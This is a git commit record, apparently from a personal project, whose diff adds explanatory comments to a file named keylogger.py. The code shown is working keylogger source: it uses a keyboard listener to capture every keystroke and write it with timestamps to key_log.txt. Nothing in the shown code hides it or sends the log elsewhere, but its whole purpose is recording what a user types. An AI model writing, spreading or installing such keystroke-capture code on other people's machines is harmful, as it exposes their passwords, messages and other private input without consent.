e1e03f480455bf6b406211d21f1342e0793c7fe0
hhhharshil <harshil@Harshils-MacBook-Air.local>
2021-05-27 16:19:26 -0400

    added comments to python file

--- keylogger.py
+++ keylogger.py
@@ -3,12 +3,13 @@ import logging
 
 logz = ""
 
+#set up a logging file which is named key_log.txt records all messages recorded by on_press function
 logging.basicConfig(filename=(logz + 'key_log.txt'), format='%(asctime)s: %(message)s', level=logging.DEBUG)
 
+#records keystroke on press and logs it
 def on_press(key):
     logging.info(str(key))
 
 # Collect events until released
-
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
